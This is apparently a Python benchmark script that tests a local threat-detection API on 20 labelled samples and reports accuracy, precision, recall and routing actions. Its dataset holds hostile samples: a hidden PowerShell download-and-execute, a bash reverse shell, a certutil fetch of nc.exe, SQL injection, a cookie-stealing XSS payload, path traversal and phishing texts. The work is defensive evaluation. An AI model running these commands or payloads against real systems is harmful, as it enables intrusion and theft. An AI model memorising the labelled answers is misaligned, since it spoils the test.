import time
import requests

API_URL = "http://localhost:5000/api/analyze-traffic"

# 20 Test Cases with Ground Truth Labels
TEST_DATASET = [
    # --- PHISHING & MALICIOUS URLS ---
    {
        "text": "URGENT: Your Netflix payment failed. Update your card details within 24 hours at http://netflix-billing-update-user.com or your account will be deleted.",
        "expected_label": "Threat",
        "category": "Phishing Email"
    },
    {
        "text": "http://www.google-security-verify-login.account-check.xyz/auth",
        "expected_label": "Threat",
        "category": "Typosquatting URL"
    },
    {
        "text": "Security Alert: Someone accessed your PayPal account. Verify now: http://paypal-resolution-center-login.net/claim",
        "expected_label": "Threat",
        "category": "Phishing Email"
    },
    {
        "text": "http://allrecipes.com/recipe/10813/best-chocolate-chip-cookies/",
        "expected_label": "Benign",
        "category": "Legitimate URL"
    },
    {
        "text": "https://github.com/torvalds/linux/commit/1a2b3c4d5e6f",
        "expected_label": "Benign",
        "category": "Legitimate URL"
    },

    # --- MALWARE & EXPLOIT SCRIPTS ---
    {
        "text": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command (New-Object System.Net.WebClient).DownloadFile('http://badsite.com/payload.exe', '$env:TEMP\\malware.exe'); Start-Process '$env:TEMP\\malware.exe'",
        "expected_label": "Threat",
        "category": "PowerShell Payload"
    },
    {
        "text": "bash -i >& /dev/tcp/185.220.101.5/4444 0>&1",
        "expected_label": "Threat",
        "category": "Reverse Shell"
    },
    {
        "text": "certutil.exe -urlcache -split -f http://malicious-domain.ru/nc.exe C:\\ProgramData\\nc.exe",
        "expected_label": "Threat",
        "category": "Living Off the Land (LOLBin)"
    },
    {
        "text": "Get-ChildItem -Path C:\\Users\\Public -Recurse -Filter *.txt",
        "expected_label": "Benign",
        "category": "Safe Script"
    },

    # --- WEB ATTACKS (SQLi / XSS / Path Traversal) ---
    {
        "text": "SELECT * FROM users WHERE username = 'admin' AND '1'='1'; DROP TABLE logs; --",
        "expected_label": "Threat",
        "category": "SQL Injection"
    },
    {
        "text": "<script>document.location='http://attacker-server.com/steal.php?cookie='+document.cookie</script>",
        "expected_label": "Threat",
        "category": "XSS Attack"
    },
    {
        "text": "GET /../../../../etc/passwd HTTP/1.1",
        "expected_label": "Threat",
        "category": "Path Traversal"
    },

    # --- SERVER LOGS ---
    {
        "text": "Failed password for root from 45.33.22.11 port 22 ssh2 (50 attempts in 30 seconds)",
        "expected_label": "Threat",
        "category": "SSH Brute Force"
    },
    {
        "text": "192.168.1.50 - - [26/Sep/2026:01:15:00] 'POST /api/v1/auth/login HTTP/1.1' 200 452",
        "expected_label": "Benign",
        "category": "Legitimate Log"
    },
    {
        "text": "CRON[1234]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)",
        "expected_label": "Benign",
        "category": "Legitimate Log"
    },

    # --- BENIGN PROMPTS & USER TEXT ---
    {
        "text": "How do I configure a UFW firewall on Ubuntu 22.04 LTS?",
        "expected_label": "Benign",
        "category": "General Question"
    },
    {
        "text": "User admin logged in successfully from office IP 192.168.10.5",
        "expected_label": "Benign",
        "category": "System Alert"
    },
    {
        "text": "Daily database backup completed successfully with 0 errors.",
        "expected_label": "Benign",
        "category": "System Alert"
    },
    {
        "text": "Hey team, attached is the updated Q3 financial report presentation.",
        "expected_label": "Benign",
        "category": "Email Text"
    },
    {
        "text": "npm install express cors dotenv jsonwebtoken",
        "expected_label": "Benign",
        "category": "Developer Command"
    }
]

def run_evaluation():
    print("=" * 85)
    print("🚀 STARTING BENCHMARK EVALUATION: CyberLLaMA v2 Microservice")
    print("=" * 85)

    tp, fp, tn, fn = 0, 0, 0, 0
    action_counts = {"BLOCK": 0, "ALLOW": 0, "FLAGGED_FOR_HUMAN": 0, "REJECTED_AMBIGUOUS": 0}
    threat_confidences = []
    benign_confidences = []
    failures = []

    start_time = time.time()

    for idx, sample in enumerate(TEST_DATASET, 1):
        text = sample["text"]
        expected = sample["expected_label"]
        category = sample["category"]

        try:
            response = requests.post(API_URL, json={"text": text}, timeout=30)
            res_data = response.json()
            
            predicted = res_data.get("predicted_label", "Unknown").capitalize()
            confidence = res_data.get("confidence", 0)
            action = res_data.get("action", "UNKNOWN")
            
            action_counts[action] = action_counts.get(action, 0) + 1

            # Confusion Matrix Tally
            is_correct = (predicted.lower() == expected.lower())
            
            if expected == "Threat":
                threat_confidences.append(confidence)
                if predicted == "Threat":
                    tp += 1
                else:
                    fn += 1
            else:
                benign_confidences.append(confidence)
                if predicted == "Benign":
                    tn += 1
                else:
                    fp += 1

            status_icon = "✅ PASS" if is_correct else "❌ FAIL"
            print(f"[{idx:02d}/20] {status_icon} | Exp: {expected:<6} | Pred: {predicted:<6} | Conf: {confidence:>3}% | Action: {action:<18} | Cat: {category}")

            if not is_correct:
                failures.append({
                    "text": text[:60] + "...",
                    "expected": expected,
                    "predicted": predicted,
                    "confidence": confidence,
                    "reason": res_data.get("explanation", "N/A")
                })

        except Exception as e:
            print(f"[{idx:02d}/20] ⚠️ ERROR sending request: {str(e)}")

    total_time = time.time() - start_time
    total_samples = len(TEST_DATASET)

    # Statistical Calculations
    accuracy = (tp + tn) / total_samples if total_samples > 0 else 0
    precision = tp / (tp + fp) if (tp + fp) > 0 else 0
    recall = tp / (tp + fn) if (tp + fn) > 0 else 0
    f1_score = 2 * (precision * recall) / (precision + recall) if (precision + recall) > 0 else 0
    
    avg_threat_conf = sum(threat_confidences) / len(threat_confidences) if threat_confidences else 0
    avg_benign_conf = sum(benign_confidences) / len(benign_confidences) if benign_confidences else 0

    # Print Statistical Report
    print("\n" + "=" * 85)
    print("📊 STATISTICAL EVALUATION METRICS REPORT")
    print("=" * 85)
    print(f"⏱️  Total Evaluation Time  : {total_time:.2f} seconds ({total_time/total_samples:.2f}s per sample)")
    print(f"🎯 Overall Accuracy        : {accuracy * 100:.2f}%")
    print(f"🎯 Precision (Threat)     : {precision * 100:.2f}%")
    print(f"🎯 Recall (Threat)        : {recall * 100:.2f}%")
    print(f"🎯 F1-Score               : {f1_score * 100:.2f}%")
    print("-" * 85)

    print("\n🧩 CONFUSION MATRIX")
    print(f"┌─────────────────┬──────────────────┬──────────────────┐")
    print(f"│ Ground Truth    │ Predicted THREAT │ Predicted BENIGN │")
    print(f"├─────────────────┼──────────────────┼──────────────────┤")
    print(f"│ Actual THREAT   │ True Pos (TP): {tp:<2}│ False Neg (FN):{fn:<2}│")
    print(f"│ Actual BENIGN   │ False Pos (FP):{fp:<2}│ True Neg (TN): {tn:<2}│")
    print(f"└─────────────────┴──────────────────┴──────────────────┘")

    print("\n🛡️  ROUTING ACTION DISTRIBUTION")
    for action, count in action_counts.items():
        pct = (count / total_samples) * 100
        print(f" • {action:<20}: {count:>2} ({pct:>5.1f}%)")

    print("\n💡 CONFIDENCE SCORE PROFILE")
    print(f" • Avg Confidence on Threats : {avg_threat_conf:.1f}%")
    print(f" • Avg Confidence on Benign  : {avg_benign_conf:.1f}%")

    if failures:
        print("\n❌ MISCLASSIFIED SAMPLES FOR ERROR ANALYSIS")
        print("-" * 85)
        for f in failures:
            print(f"Sample    : {f['text']}")
            print(f"Expected  : {f['expected']} | Predicted: {f['predicted']} (Conf: {f['confidence']}%)")
            print(f"Model Reason: {f['reason']}\n")
    else:
        print("\n🎉 PERFECT SCORE! 0 Misclassifications detected.")

if __name__ == "__main__":
    run_evaluation()
